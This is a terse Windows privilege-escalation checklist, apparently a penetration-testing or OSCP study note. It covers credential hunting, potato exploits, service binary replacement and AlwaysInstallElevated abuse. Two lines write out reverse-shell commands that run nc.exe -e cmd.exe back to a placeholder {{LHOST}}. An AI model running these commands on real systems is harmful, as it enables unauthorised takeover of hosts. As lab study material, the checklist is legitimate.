
#### SOP for Windows 

0. Run whoami /all 
1. Look around for creds, log files, (and _run_) .ps1 , .sqlite , .db , .kdbx files 
2. Look around for **unusual** programs & services running, and where they store creds 
3. PowerShell history (C:\Users\user\appdata\roaming\microsoft\windows\powershell\psreadline) 
4. Potato eg `PrintSpoofer.exe -c "C:\nc.exe {{LHOST}} 443 -e cmd.exe"` 
    - Try Print, god, juicy, rogue, sigma ; also check nc or nc64 
    - FullPowers.exe if missing privileges, some need a CLSID, eg Win Server 2008 TrustedInstaller 
5. Services (eg `ps` or `sc.exe start|stop dns`, and `netstat -ano`) 
6. Run PowerUp or PrivescCheck (eg `icacls`, **replace target exe with cmd or rev shell**, `shutdown /r /t 0`) 

#### Unusual exploits 
- If winPEAS ~ AlwaysInstallElevated = msfvenom **msi** 
- Xampp => https://www.exploit-db.com/exploits/50337 
- Symbolic link => https://portal.offsec.com/machine/symbolic-38080/overview/details 
> If no pw or hash, `runas /user:administrator "C:\nc.exe -e cmd.exe {{LHOST}} 443"` 

